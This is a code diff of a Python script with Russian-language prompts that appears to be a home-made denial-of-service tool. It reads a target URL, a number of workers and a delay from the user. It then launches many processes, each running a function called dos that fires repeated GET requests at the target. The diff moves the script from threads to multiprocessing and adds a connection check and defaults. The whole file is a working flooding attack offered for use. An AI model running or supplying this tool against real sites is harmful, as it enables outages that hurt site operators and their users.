@@ -1,24 +1,23 @@
 from tqdm import tqdm
-import threading
+import multiprocessing
 import time
-from turtle import back
 import requests
 import colorama
 import os
-# Grade-collab
-# проверка соединения
-host = "google.com"
-access = os.system("ping -n 2 " + host)
-if access == 0:
-    print(colorama.Fore.GREEN + "Подключение стабильное")
-else:
-    print(colorama.Fore.RED + "Не имеется подключение к сети! Остановка")
-    quit()
-# ^^^^^^^ проверка соединения
-threads = int(input("Укажите количество повторов:"))
 
-url = input("URL:")
-timeout = float(input("Задержка перед отправкой (по умолчанию 0.3):"))
+"""
+    @author Grade-Collab
+    @author TheEnderOfficial
+"""
+
+
+def check_connection():
+    access = os.system("ping -n 2 8.8.8.8")
+    if access == 0:
+        print(colorama.Fore.GREEN + "Подключение стабильное")
+    else:
+        print(colorama.Fore.RED + "Не имеется подключение к сети! Остановка")
+        quit()
 
 
 def dos(target):
@@ -26,15 +25,42 @@ def dos(target):
         res = requests.get(target)
 
 
-print(colorama.Fore.GREEN + "Запущено: " + url)
-pbar = tqdm(total=threads)
-if not url.__contains__("http"):
-    url = "https://" + url
-for i in range(0, threads):
-    thr = threading.Thread(target=dos, args=(url,))
-    thr.start()
-    time.sleep(timeout)
-    pbar.update(1)
-print(" Выполнено, спасибо за пользование программой")
-time.sleep(2)
-os._exit(1)
+def main():
+    check_connection()
+
+    try:
+        threads_ = input("Укажите количество потоков (по умолчанию 16):")
+        threads = int(threads_)
+    except Exception:
+        threads = 16
+
+    url = input("URL:")
+    try:
+        timeout_ = input("Задержка перед отправкой в миллисекундах (по умолчанию 300):")
+        timeout = int(timeout_) / 1000
+    except Exception:
+        timeout = 300 / 1000
+
+    if not url.__contains__("http"):
+        url = "https://" + url
+
+    print(colorama.Fore.GREEN + "Запущено: " + url)
+
+    pbar = tqdm(total=threads)
+    thrs = []
+    for i in range(0, threads):
+        thr = multiprocessing.Process(target=dos, args=(url,))
+        thr.start()
+        thrs.append(thr)
+        time.sleep(timeout)
+        pbar.update(1)
+    pbar.close()
+
+    for i in thrs:
+        i.terminate()
+
+    print("Выполнено, спасибо за пользование программой.")
+
+
+if __name__ == '__main__':
+    main()
